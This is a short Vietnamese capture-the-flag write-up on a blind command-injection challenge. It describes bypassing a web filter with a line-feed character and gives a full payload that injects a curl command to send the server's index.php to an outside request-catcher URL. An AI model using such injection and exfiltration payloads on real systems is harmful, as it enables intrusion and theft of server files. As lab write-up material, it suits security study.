Chall này cần 2 resource để giải quyết:

1. Payloads để bypass cái filter của trang web, có thể dùng [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) hoặc [link](https://github.com/payloadbox/command-injection-payload-list), dùng intruder để brute force thử, cuối cùng sẽ ra kí tự `line feed`(%0A) có thể dùng để inject command
2. cURL có chức năng gửi file, dùng @ trước tên file để đọc toàn bộ nội dung của file. Tại sao cần cURL, bởi vì đây là dạng blind injection nên nó sẽ không hiện ra cái mình cần trong response

Payload: ip=127.0.0.1%0a curl -d @index.php https://f79aa2771db8344b022a535bce6b246b.m.pipedream.net

(Ở đây dùng pipedream để bắt request)